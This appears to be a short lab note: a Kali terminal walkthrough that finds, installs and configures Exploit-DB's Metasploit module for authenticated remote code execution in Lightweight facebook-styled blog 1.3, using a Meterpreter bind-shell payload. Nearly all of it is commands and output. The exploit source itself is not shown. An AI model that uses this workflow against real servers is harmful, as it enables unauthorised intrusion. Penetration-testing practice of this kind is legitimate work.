# Shell-Payload

root@kali:~# searchsploit Lightweight
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Lightweight facebook-styled blog 1.3 - Remote Code Execution (RCE) (Authenticated) (Metasploit)                                                                                                          | php/webapps/50064.rb
Lightweight news portal (LNP) 1.0b - Multiple Vulnerabilities                                                                                                                                            | php/webapps/5873.txt
Mollensoft Lightweight FTP Server 3.6 - Remote Buffer Overflow                                                                                                                                           | windows/dos/24150.pl
Mollensoft Lightweight FTP Server 3.6 - Remote Denial of Service                                                                                                                                         | windows/dos/24142.pl
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
root@kali:
root@kali:~# locate 50064.rb
/usr/share/exploitdb/exploits/php/webapps/50064.rb

root@kali:~# cd /root/.msf4/
root@kali:~/.msf4# ls
bootsnap_cache  data  history  ldap_queries.yaml  local  logos  logs  loot  meterpreter_history  modules  plugins  store
root@kali:~/.msf4# cd modules/
root@kali:~/.msf4/modules# ls
root@kali:~/.msf4/modules# mkdir exploits
root@kali:~/.msf4/modules# ls
exploits
root@kali:~/.msf4/modules# cd exploits/
root@kali:~/.msf4/modules/exploits# ls
root@kali:~/.msf4/modules/exploits# mkdir php
root@kali:~/.msf4/modules/exploits# cd php/
root@kali:~/.msf4/modules/exploits/php# ls
root@kali:~/.msf4/modules/exploits/php# pwd
/root/.msf4/modules/exploits/php

root@kali:~# cp /usr/share/exploitdb/exploits/php/webapps/50064.rb /root/.msf4/modules/exploits/php

msf6 > use exploit/php/50064

maybe we need this to do in msfconsole:

msf6 > reload_all

we can search to know the right path:

msf6 > search 50064

Matching Modules
================

   #  Name               Disclosure Date  Rank       Check  Description
   -  ----               ---------------  ----       -----  -----------
   0  exploit/php/50064  2018-12-19       excellent  No     Lightweight facebook-styled blog authenticated remote code execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/php/50064


msf6 > use exploit/php/50064 
[*] Using configured payload php/meterpreter/bind_tcp
msf6 exploit(php/50064) > show options 

Module options (exploit/php/50064):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   demo             yes       Blog password
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The URI of the arkei gate
   USERNAME   demo             yes       Blog username
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/bind_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LPORT  4444             yes       The listen port
   RHOST                   no        The target address


Exploit target:

   Id  Name
   --  ----
   0   PHP payload



View the full module info with the info, or info -d command.

msf6 exploit(php/50064) > 


I filled out the required and exploited.
